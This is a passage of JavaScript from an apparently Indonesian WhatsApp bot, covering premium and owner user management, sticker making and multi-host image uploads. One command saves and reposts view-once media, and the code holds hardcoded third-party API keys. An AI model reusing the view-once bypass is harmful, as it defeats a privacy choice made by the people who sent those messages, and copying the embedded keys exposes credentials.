                    header: `𝗔𝗗𝗗 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗩${i + 1}`,
                    title: `Tambahkan Reseller Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}res_addpremv${i + 1} ${phoneNumber}`
                }))
            },
            {
                title: "# Opsi Untuk Menambahkan Owner user",
                highlight_label: ``,
                rows: [
                    { 
                        header: `𝗔𝗗𝗗 𝗢𝗪𝗡𝗘𝗥 𝗨𝗦𝗘𝗥`, 
                        title: "Tambahkan Owner Userr", 
                        id: `${prefix}res_addowners ${phoneNumber}` 
                    }
                ]
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Server 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗦𝗟𝗘𝗕𝗘𝗪",
            footer: `${botname}`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: ppmenu,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in addpremium:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "delprem":
case "delpremium": {
    if (!isCreator) return;
    if (!text && !m.mentionedJid && !m.quoted) return ReplyLanz(example("@tag/Nomor/Balas pesan target"));

    let phoneNumber;

    if (m.mentionedJid?.length) {
        phoneNumber = m.mentionedJid[0].replace(/@s\.whatsapp\.net$/, "").trim();
    } else if (m.quoted) {
        phoneNumber = m.quoted.sender.replace(/@s\.whatsapp\.net$/, "");
    } else if (text) {
        phoneNumber = text.replace(/[^0-9]/g, "");
    }

    if (!phoneNumber) return ReplyLanz(example("@tag/Nomor/Balas pesan target"));
    if (phoneNumber.startsWith("0")) return ReplyLanz("⚠️ Awalan nomor harus berupa kode negara (62xx), bukan 0!");

    const check = await Putzz.onWhatsApp(phoneNumber);
    if (check.length < 1) return ReplyLanz("⚠️ Nomor tersebut tidak terdaftar di WhatsApp!");

    try {
        const teksnya = "*Pilih Versi Untuk Menghapus User Premium*\n> Note: Versi premium harus sesuai dengan di versi berapakah nomor target ditambahkan menjadi user premium.";

        const sections = [
            {
                title: "# Silahkan Pilih Server Untuk Menghapus Reseller Panel",
                highlight_label: ``,
                rows: Array.from({ length: 100 }, (_, i) => ({
                    header: `𝗛𝗔𝗣𝗨𝗦 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗩${i + 1}`,
                    title: `Hapus Reseller Panel Dari Server Ke-${i + 1}`,
                    id: `${prefix}res_delpremv${i + 1} ${phoneNumber}`
                }))
            },
            {
                title: "# Opsi Untuk Menghapus Reseller Subdomain",
                highlight_label: ``,
                rows: [
                    { 
                        header: `𝗛𝗔𝗣𝗨𝗦 𝗢𝗪𝗡𝗘𝗥 𝗨𝗦𝗘𝗥`, 
                        title: "Hapus Owner Userr", 
                        id: `${prefix}res_delowners ${phoneNumber}` 
                    }
                ]
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Server 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗦𝗟𝗘𝗕𝗘𝗪",
            footer: `${botname}`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: ppmenu,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in delpremium:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "listprem":
case "listpremium": {
    if (!isOwner) return;

    try {
        const teksnya = "*Pilih versi yang ingin Anda lihat daftar user premiumnya.*";

        const sections = [
            {
                title: "# Silahkan Pilih Versi Premium Yang Ingin Dilihat Daftarnya",
                highlight_label: ``,
                rows: Array.from({ length: 100 }, (_, i) => ({
                    header: `📌 𝗟𝗜𝗦𝗧 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗩${i + 1}`,
                    title: `Melihat Daftar User Premium V${i + 1}`,
                    id: `${prefix}res_listpremv${i + 1}`
                }))
            },
            {
                title: "# Opsi Untuk Melihat Daftar Reseller Subdomain",
                highlight_label: ``,
                rows: [
                    {
                        header: `📌 𝗟𝗜𝗦𝗧 𝗢𝗪𝗡𝗘𝗥 𝗨𝗦𝗘𝗥`,
                        title: "Melihat Daftar Owner Userr",
                        id: `${prefix}res_listowners`
                    }
                ]
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "📋 Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗦𝗟𝗘𝗕𝗘𝗪",
            footer: `${botname}`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: ppmenu,
                    title: `⚡ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in listpremium:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //


    case "res_addpremv1":
    case "res_addpremv2":
    case "res_addpremv3":
    case "res_addpremv4":
    case "res_addpremv5":
    case "res_addpremv6":
    case "res_addpremv7":
    case "res_addpremv8":
    case "res_addpremv9":
    case "res_addpremv10":
    case "res_addpremv11":
    case "res_addpremv12":
    case "res_addpremv13":
    case "res_addpremv14":
    case "res_addpremv15":
    case "res_addpremv16":
    case "res_addpremv17":
    case "res_addpremv18":
    case "res_addpremv19":
    case "res_addpremv20":
    case "res_addpremv21":
    case "res_addpremv22":
    case "res_addpremv23":
    case "res_addpremv24":
    case "res_addpremv25":
    case "res_addpremv26":
    case "res_addpremv27":
    case "res_addpremv28":
    case "res_addpremv29":
    case "res_addpremv30":
    case "res_addpremv31":
    case "res_addpremv32":
    case "res_addpremv33":
    case "res_addpremv34":
    case "res_addpremv35":
    case "res_addpremv36":
    case "res_addpremv37":
    case "res_addpremv38":
    case "res_addpremv39":
    case "res_addpremv40":
    case "res_addpremv41":
    case "res_addpremv42":
    case "res_addpremv43":
    case "res_addpremv44":
    case "res_addpremv45":
    case "res_addpremv46":
    case "res_addpremv47":
    case "res_addpremv48":
    case "res_addpremv49":
    case "res_addpremv50":
    case "res_addpremv51":
    case "res_addpremv52":
    case "res_addpremv53":
    case "res_addpremv54":
    case "res_addpremv55":
    case "res_addpremv56":
    case "res_addpremv57":
    case "res_addpremv58":
    case "res_addpremv59":
    case "res_addpremv60":
    case "res_addpremv61":
    case "res_addpremv62":
    case "res_addpremv63":
    case "res_addpremv64":
    case "res_addpremv65":
    case "res_addpremv66":
    case "res_addpremv67":
    case "res_addpremv68":
    case "res_addpremv69":
    case "res_addpremv70":
    case "res_addpremv71":
    case "res_addpremv72":
    case "res_addpremv73":
    case "res_addpremv74":
    case "res_addpremv75":
    case "res_addpremv76":
    case "res_addpremv77":
    case "res_addpremv78":
    case "res_addpremv79":
    case "res_addpremv80":
    case "res_addpremv81":
    case "res_addpremv82":
    case "res_addpremv83":
    case "res_addpremv84":
    case "res_addpremv85":
    case "res_addpremv86":
    case "res_addpremv87":
    case "res_addpremv88":
    case "res_addpremv89":
    case "res_addpremv90":
    case "res_addpremv91":
    case "res_addpremv92":
    case "res_addpremv93":
    case "res_addpremv94":
    case "res_addpremv95":
    case "res_addpremv96":
    case "res_addpremv97":
    case "res_addpremv98":
    case "res_addpremv99":
    case "res_addpremv100": {
    if (!isCreator) return;
    if (!text) return;

    let version = command.replace("res_addpremv", "");
    let premium = eval(`premium${version}`);

    let input = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let input2 = input.split("@")[0];

    if ([global.owner, botNumber, ...premium].includes(input)) {
        return ReplyLanz(`⚠️ Nomor *${input2}* sudah menjadi user premium v${version}!`);
    }

    premium.push(input);

    try {
        fs.writeFileSync(`./library/database/userVip/premium${version}.json`, JSON.stringify(premium, null, 2));
        await ReplyLanz(`✅ Berhasil menambahkan *${input2}* sebagai user premium v${version}!`);
    } catch (error) {
        console.error("❌ Error saat menyimpan data premium:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat menyimpan data premium.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_listpremv1": case "res_listpremv2": case "res_listpremv3": case "res_listpremv4": case "res_listpremv5":
case "res_listpremv6": case "res_listpremv7": case "res_listpremv8": case "res_listpremv9": case "res_listpremv10": {
    if (!isCreator) return;

    let version = command.replace("res_listpremv", "");
    let premium;

    try {
        premium = eval(`premium${version}`);
        if (!Array.isArray(premium)) throw new Error(`Variabel premium${version} tidak valid.`);
    } catch (err) {
        return ReplyLanz(`⚠️ Terjadi kesalahan dalam membaca daftar premium v${version}.`);
    }

    if (premium.length === 0) return ReplyLanz(`⚠️ Tidak ada user premium v${version}.`);

    let teksnya = `*🔰 List User Premium V${version} 🔰*\n\n`;
    premium.forEach((e, i) => {
        teksnya += `╭───────────────◉\n`;
        teksnya += `│ *${i + 1}.* @${e.split("@")[0]}\n`;
        teksnya += `╰───────────────◉\n\n`;
    });

    await Putzz.sendMessage(m.chat, { text: teksnya, mentions: premium }, { quoted: qfake });
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_delpremv1": case "res_delpremv2": case "res_delpremv3": case "res_delpremv4": case "res_delpremv5":
case "res_delpremv6": case "res_delpremv7": case "res_delpremv8": case "res_delpremv9": case "res_delpremv10": {
    if (!isCreator) return;
    if (!text) return;

    let version = command.replace("res_delpremv", "");
    let premium = eval(`premium${version}`);

    let input = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let input2 = input.split("@")[0];

    if ([global.owner, botNumber].includes(input)) {
        return ReplyLanz(`⚠️ Tidak bisa menghapus owner atau bot dari daftar premium!`);
    }

    if (!premium.includes(input)) {
        return ReplyLanz(`⚠️ Nomor *${input2}* bukan user premium v${version}!`);
    }

    premium.splice(premium.indexOf(input), 1);

    try {
        fs.writeFileSync(`./library/database/userVip/premium${version}.json`, JSON.stringify(premium, null, 2));
        await ReplyLanz(`✅ Berhasil menghapus *${input2}* dari daftar user premium v${version}!`);
    } catch (error) {
        console.error("❌ Error saat menyimpan perubahan:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat menghapus data premium.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_addowners": {
    if (!isOwner && !isCreator) return ReplyLanz(mess.owner)

    let orang = "";

    if (m.mentionedJid && m.mentionedJid.length > 0) {
        orang = m.mentionedJid[0];
    } else if (text) {
        orang = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    }

    if (!orang) return;

    if (owners.includes(orang)) {
        return ReplyLanz(`*Gagal Menambah Owner Userr!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *Owner Userr*`);
    }

    owners.push(orang);
    fs.writeFileSync("./library/database/userVip/owner.json", JSON.stringify(owners));

    ReplyLanz(`Berhasil Menambahkan Nomor ${orang.split('@')[0]} Ke Dalam Database *Owner Userr ✅*`);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_delowners": {
    if (!isOwner) return;

    if (text) {
        let orang = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        if (!owners.includes(orang)) {
            return ReplyLanz(`*Gagal Menghapus Owner Userr!*\nNomor ${orang.split('@')[0]} Tidak Terdaftar Di Database *Owner Userr*`);
        }

        let indx = owners.indexOf(orang);
        await owners.splice(indx, 1);
        await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners));

        ReplyLanz(`✅ Berhasil Menghapus Nomor ${orang.split('@')[0]} Dari Database *Owner user*`);
    } else {
        return ReplyLanz(example("@tag/62xxx"));
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_listowners": {
    if (owners.length < 1) {
        return ReplyLanz("Tidak Ada *Owner userr*");
    }

    let teksnya = `*🔰 List Owner User 🔰*\n\n`;
    
    owners.forEach(e => {
        teksnya += `┏━━━━━━━━━━━━━━━━━━━\n`;
        teksnya += `➠ *Nomor:* ${e.split("@")[0]}\n`;
        teksnya += `┗━━━━━━━━━━━━━━━━━━━\n\n`;
    });

    Putzz.sendMessage(m.chat, { text: teksnya, mentions: [...owners] }, { quoted: qfake });
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "s": case "sticker": case "stiker": {
  if (!/image|video/.test(mime)) return ReplyLanz(example("namamu dengan kirim media"))
var image = await Putzz.downloadAndSaveMediaMessage(m.quoted)
await Putzz.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'farewel':{
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function main() {
  console.log('Rumahmu yang dulu toko minuman');
  await delay(2400);
  
  console.log('Sekarang menjadi minimarket');
  await delay(1900);
  
  console.log('Saat kuintip ke balik jendela');
  await delay(2300);
  
  console.log('Kamu berdiri di kasir counter');
  await delay(2600);
  
  console.log('Cita-citamu menjadi seorang hair stylist');
  await delay(2800);
  
  console.log('Waktu itu kamu pernah bercerita');
  await delay(2100);
  
  console.log('Walau tak seperti yang kamu bayangkan');
  await delay(2400);
  
  console.log('Kamu terlihat bahagia');
  await delay(1700);
  
  console.log('Aku jadi lega');
  await delay(3000); // ada jeda napas jelas di sini
  
  console.log('Kudengar kalau kamu sudah menikah');
  await delay(3400);
  
  console.log('Aku terlambat bilang suka kepadamu');
  await delay(2800);
  
  console.log('Kudengar kamu pun sekarang punya anak');
  await delay(2500);
  
  console.log('Tak sanggup memanggilmu, farewell masa mudaku');
  await delay(4000); // ini paling panjang (ending chorus)
  
  console.log('Sekarang juga, kamu yang teristimewa');
  await delay(2600);
  
  console.log('Ada di pojok kanan buku tahunan kita');
  await delay(2400);
  
  console.log('Sungguh, memang kamu yang teristimewa');
  await delay(2300);
  
  console.log('Berapa kali kubuka untuk memastikannya');
  await delay(3300);
}

await main();
}
break
case "swm2": 
case "stickerwm2": 
case "stikerwm2": 
case "wm2": { 
  if (!text) return ReplyLanz(example("namamu dengan kirim media"))
  if (!/image|video/gi.test(mime)) return ReplyLanz(example("namamu dengan kirim media"))
  if (/video/gi.test(mime) && qmsg.seconds > 15) return ReplyLanz("Durasi vidio maksimal 15 detik!")
  var buffer = await Putzz.downloadAndSaveMediaMessage(qmsg)
  await Putzz.sendImageAsSticker(m.chat, buffer, m, {
    packname: global.author, 
    author: text
  })
}
break;
case "swm": 
case "stickerwm": 
case "stikerwm": 
case "wm": { 
  if (!text.includes("|")) return ReplyLanz(example("namamu|author"))
  let [packname, author] = text.split("|")
  if (!/image|video/gi.test(mime)) return ReplyLanz(example("namamu dengan kirim media"))
  if (/video/gi.test(mime) && qmsg.seconds > 15) return ReplyLanz("Durasi vidio maksimal 15 detik!")
  var buffer = await Putzz.downloadAndSaveMediaMessage(qmsg)
  await Putzz.sendAsSticker(m.chat, buffer, m, {
    packname: packname.trim(), 
    author: author.trim()
  })
}
break;
            case 'stikersearch':
            case 'stiksearch':
            case 'searchstik':
            case 'caristicker':
            case 'caristiker': {
                if (!text) return ReplyLanz(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} yaya`)
                let anu = await stickerSearch(text)
                for (let stik of anu.sticker) {
                    var stk = await getBuffer(stik)
                    await Putzz.sendAsSticker(m.chat, stk, m, {
                        packname: `Sticker Maker\nNomor Bot :`,
                        author: `${stickerthink}`
                    })
                    await sleep(3000)
                }
            }
            break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "rvo": case "readviewonce": {
if (!m.quoted) return ReplyLanz(example("dengan Reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return ReplyLanz("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Putzz.sendMessage(m.chat, {video: buffer, caption: 'Caption: ' + msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Putzz.sendMessage(m.chat, {image: buffer, caption: 'Caption: ' + msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Putzz.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tour2l": {
  if (!qmsg) return ReplyLanz('Pesan tidak ditemukan');
  let mime = qmsg.mimetype;
  if (!/image/.test(mime)) return ReplyLanz(`Balas image dengan caption *${prefix + command}*`);

let media = await Putzz.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'putzganteng.png');

let teks = directLink.toString()
await Putzz.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tourl4": {
    if (!m.quoted) return ReplyLanz(example("dengan kirim atau reply foto!"));

    const uploadToSupa = async (buffer) => {
        try {
            const form = new FormData();
            form.append('file', buffer, 'upload.jpg');
            const res = await axios.post('https://i.supa.codes/api/upload', form, { headers: form.getHeaders() });
            return res.data?.link || null;
        } catch (error) {
            console.error('Supa Upload Error:', error?.response?.data || error.message);
            return null;
        }
    };

    const uploadToPixhost = async (buffer) => {
        try {
            const service = new ImageUploadService("pixhost.to");
            const { directLink } = await service.uploadFromBinary(buffer, "Putzz.png");
            return directLink;
        } catch (err) {
            console.error("Pixhost Upload Error:", err);
            return null;
        }
    };

    const uploadToPostimg = async (buffer) => {
        try {
            const service = new ImageUploadService("postimages.org");
            const { directLink } = await service.uploadFromBinary(buffer, "Putzz.png");
            return directLink;
        } catch (err) {
            console.error("Postimg Upload Error:", err);
            return null;
        }
    };

    const uploadToCatbox = async (buffer) => {
        try {
            const form = new FormData();
            form.append("fileToUpload", buffer, "file.zip");
            form.append("reqtype", "fileupload");
            const res = await fetch("https://catbox.moe/user/api.php", { method: "POST", body: form });
            const url = await res.text();
            return url.includes("https://") ? url : null;
        } catch (err) {
            console.error("Catbox Upload Error:", err);
            return null;
        }
    };

    const uploadToImgbb = async (buffer) => {
        try {
            const form = new FormData();
            form.append('image', buffer.toString('base64'));
            const res = await axios.post('https://api.imgbb.com/1/upload?key=df2e5d439193adab386b649b249d2cce', form, { headers: form.getHeaders() });
            return res.data.data.url;
        } catch (error) {
            console.error('ImgBB Upload Error:', error);
            return null;
        }
    };

    const tmpFiles = async (filePath) => {
        try {
            const buffer = fs.readFileSync(filePath);
            const { ext, mime } = await fromBuffer(buffer);
            const form = new FormData();
            form.append('file', buffer, { filename: `${Date.now()}.${ext}`, contentType: mime });
            const res = await axios.post('https://tmpfiles.org/api/v1/upload', form, { headers: form.getHeaders() });
            return res.data.data.url.replace('s.org/', 's.org/dl/');
        } catch (error) {
            console.error('TmpFiles Error:', error);
            return null;
        }
    };

    const uploadToUguu = async (filePath) => {
        try {
            const form = new FormData();
            form.append('files[]', fs.createReadStream(filePath));
            const res = await axios.post('https://uguu.se/upload.php', form, { headers: form.getHeaders() });
            return res.data.files?.[0]?.url || null;
        } catch (error) {
            console.error('Uguu Upload Error:', error);
            return null;
        }
    };

    const uploadToFreeImageHost = async (buffer) => {
        try {
            const form = new FormData();
            form.append('source', buffer, 'image.jpg');
            const res = await axios.post('https://freeimage.host/api/1/upload', form, {
                params: { key: '6d207e02198a847aa98d0a2a901485a5' },
                headers: form.getHeaders()
            });
            return res.data.image.url;
        } catch (error) {
            console.error('FreeImage.Host Error:', error?.response?.data || error.message);
            return null;
        }
    };

    const processUpload = async () => {
        await reaksi("⏳");
        try {
            const media = m.quoted ? await m.quoted.download() : await m.download();
            if (!media) {
                await reaksi("❌");
                return ReplyLanz("Gagal mengunduh file.");
            }
    
            const tmpPath = path.join(__dirname, `tmp_upload_${Date.now()}.jpg`);
            fs.writeFileSync(tmpPath, media);

            const uploaders = [
                () => uploadToPixhost(media),
                () => uploadToPostimg(media),
                () => uploadToSupa(media),
                () => uploadToCatbox(media),
                () => uploadToFreeImageHost(media),
                () => uploadToImgbb(media),
                () => tmpFiles(tmpPath),
                () => uploadToUguu(tmpPath)
            ];

            const results = await Promise.allSettled(uploaders.map(fn => fn()));

            if (fs.existsSync(tmpPath)) fs.unlinkSync(tmpPath);

            let links = results
                .map(r => r.status === 'fulfilled' && r.value ? r.value : null)
                .filter(Boolean);

            if (!links.length) {
                await reaksi("❌");
                return ReplyLanz("❌ Tidak ada layanan yang berhasil mengunggah gambar.");
            }
            
            const responseText = links.map((link, i) => `${i + 1}. ${link}`).join('\n\n');
            await reaksi("✅");
            await ReplyLanz(`*Nih bang tinggal pilih:*\n\n${responseText}`);
        } catch (err) {
            console.error('Upload Error:', err);
            await reaksi("❌");
            await ReplyLanz("❌ Gagal mengunggah gambar.");
        }
    };

    await processUpload();
}
break;
case "tourl2": {
const FormData = require("form-data");
const mime = require("mime-types");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
async function pomf2(filePath) {
    try {
        if (!fs.existsSync(filePath)) throw new Error("File tidak ditemukan");
        const contentType = mime.lookup(filePath) || "application/octet-stream";
        const fileName = path.basename(filePath);
        const ext = path.extname(filePath).toLowerCase();
        const form = new FormData();
        form.append("files[]", fs.createReadStream(filePath), {
            contentType,
            filename: fileName+'.jpg', // Paksa nama file tetap JPG
        });
        const response = await axios.post("https://qu.ax/upload.php", form, {
            headers: {
                ...form.getHeaders(),
            },
        });

        // Cek hasil
        if (!response.data.success || !response.data.files?.length) throw new Error("Upload gagal");
        
        return response.data.files[0].url;
    } catch (err) {
        console.error("Error:", err.message);
        return null;
    }
}
    try {
      const media = await Putzz.downloadAndSaveMediaMessage(quoted)
        let link = await pomf2(media);
        if (!link) throw 'Gagal mengunggah media.';

        let caption = `╭─ 「 UPLOAD SUCCESS 」
📂 Size: ${media.length} Byte
🌍 URL: ${link}
📌 Expired: permanent
╰───────────────`;

        let thumbnail = await prepareWAMessageMedia(
            { image: { url: ppmenu } },
            { upload: Putzz.waUploadToServer }
        );

        let msg = {
            interactiveMessage: proto.Message.InteractiveMessage.create({
                header: proto.Message.InteractiveMessage.Header.create({
                    hasMediaAttachment: true,
                    ...thumbnail
                }),
                body: proto.Message.InteractiveMessage.Body.create({ text: caption }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "Tekan tombol di bawah untuk menyalin tautan."
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        {
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Copy Link",
                                copy_code: link
                            })
                        }
                    ]
                })
            })
        };

        await Putzz.relayMessage(m.chat, msg, { messageId: m.key.id });

    } catch (error) {
        ReplyLanz(`Error: ${error.message || error}`);
    }
}
break
async function uploadToCatbox(filePath) {
try {

const buffer = fs.readFileSync(filePath)

const type = await fromBuffer(buffer)

const ext = type?.ext || "jpg"
const mime = type?.mime || "image/jpeg"

const form = new FormData()

form.append("reqtype", "fileupload")

form.append(
"fileToUpload",
buffer,
{
filename: `upload.${ext}`,
contentType: mime
}
)

const res = await axios({
method: "POST",
url: "https://catbox.moe/user/api.php",
data: form,
headers: {
...form.getHeaders(),
"User-Agent": "Mozilla/5.0"
},
maxContentLength: Infinity,
maxBodyLength: Infinity
})

const data = String(res.data).trim()

console.log("CATBOX:", data)

if (
!data.startsWith("https://files.catbox.moe/")
) {
throw new Error(data)
}

return data

} catch (err) {

console.log(
"Catbox Error:",
err?.response?.data || err.message
)

return null
}
}
case 'tourl': {
try {

if (!quoted && !/image|video|audio|sticker|document/.test(mime)) {
return ReplyLanz(example("reply/kirim media"))
}

const fs = require("fs")
const path = require("path")
const axios = require("axios")
const FormData = require("form-data")
const mimeTypes = require("mime-types")
const { fromBuffer } = require("file-type")
const { ImageUploadService } = require("node-upload-images")

const quotedMsg = m.quoted ? m.quoted : m
const media = await Putzz.downloadAndSaveMediaMessage(quotedMsg)

/* =========================
   FUNCTIONS
========================= */

async function uploadToPixhost(filePath) {
try {

const service = new ImageUploadService("pixhost.to")

const { directLink } =
await service.uploadFromBinary(
fs.readFileSync(filePath),
`Lanz-${Date.now()}.jpg`
)

return directLink.toString()

} catch (e) {

console.log("PixHost Error:", e.message)

return null
}
}

async function uploadToUguu(filePath) {
try {

const form = new FormData()

form.append(
"files[]",
fs.createReadStream(filePath)
)

const { data } = await axios.post(
"https://uguu.se/upload.php",
form,
{
headers: form.getHeaders()
}
)

return data.files[0].url

} catch (e) {

console.log("Uguu Error:", e.message)

return null
}
}

async function uploadToSupa(buffer) {
try {

const form = new FormData()

form.append("file", buffer, "upload.jpg")

const res = await axios.post(
"https://i.supa.codes/api/upload",
form,
{
headers: form.getHeaders()
}
)

return res.data?.link || null

} catch (error) {

console.error(
"Supa Upload Error:",
error?.response?.data || error.message
)

return null
}
}

async function uploadToTmpFiles(filePath) {
try {

const buffer = fs.readFileSync(filePath)

const type = await fromBuffer(buffer)

const ext = type?.ext || "jpg"
const mimetype = type?.mime || "image/jpeg"

const form = new FormData()

form.append("file", buffer, {
filename: `${Date.now()}.${ext}`,
contentType: mimetype
})

const res = await axios.post(
"https://tmpfiles.org/api/v1/upload",
form,
{
headers: form.getHeaders()
}
)

return res.data.data.url
.replace("tmpfiles.org/", "tmpfiles.org/dl/")

} catch (error) {

console.error(
"TmpFiles Error:",
error?.response?.data || error.message
)

return null
}
}

async function pomf2(filePath) {
try {

if (!fs.existsSync(filePath)) {
throw new Error("File tidak ditemukan")
}

const contentType =
mimeTypes.lookup(filePath) ||
"application/octet-stream"

const fileName = path.basename(filePath)

const form = new FormData()

form.append(
"files[]",
fs.createReadStream(filePath),
{
contentType,
filename: fileName
}
)

const response = await axios.post(
"https://qu.ax/upload.php",
form,
{
headers: {
...form.getHeaders()
}
}
)

if (
!response.data.success ||
!response.data.files?.length
) {
throw new Error("Upload gagal")
}

return response.data.files[0].url

} catch (err) {

console.error(
"Pomf2 Error:",
err?.response?.data || err.message
)

return null
}
}

/* =========================
   START
========================= */

await Putzz.sendMessage(m.chat, {
react: {
text: "⏳",
key: m.key
}
})

const buffer = fs.readFileSync(media)

const [
pixhost,
catbox,
uguu,
supa,
tmpfiles,
quax
] = await Promise.all([

uploadToPixhost(media),
uploadToCatbox(media),
uploadToUguu(media),
uploadToSupa(buffer),
uploadToTmpFiles(media),
pomf2(media)

])

let results = [
{
name: "PixHost",
